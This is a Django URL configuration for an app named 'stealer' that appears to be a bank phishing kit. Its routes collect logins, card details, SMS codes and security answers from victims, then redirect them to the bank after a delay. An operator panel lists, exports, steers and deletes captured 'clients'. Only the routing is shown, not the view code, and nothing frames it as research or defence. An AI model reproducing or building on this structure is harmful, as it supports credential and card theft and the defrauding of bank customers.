from django.urls import path
from django.contrib.staticfiles.urls import staticfiles_urlpatterns

from stealer.views import *

urlpatterns = [
    path('login/', login, name='login'),
    path('', redirect_login),
    path('sms/', sms),
    path('driver/', driver),
    path('question/', question),
    path('card/', card),
    path('profile/', profile),
    path('redirect_page/', get_redirect_to_page),
    path('complete/', redirect_bank_with_delay),
    path('ask_sms/', ask_for_sms),


    path('set_redirect/', set_redirect),
    path('set_question/', set_question),
    path('switch_afk/', switch_afk),
    path('client_export/<int:pk>', client_export),
    path('admin_updates/', admin_updates),
    path('client/<int:pk>', client_detailed, name='client'),
    path('clients/', clients, name='clients'),
    path('delete_client/', delete_client),
    path('delete_all/', delete_all_clients),
    path('delete_selected/', delete_selected),
    path('delete_all_deleted/', delete_all_deleted),
    path('settings/', settings_page, name='settings'),
]

urlpatterns += staticfiles_urlpatterns()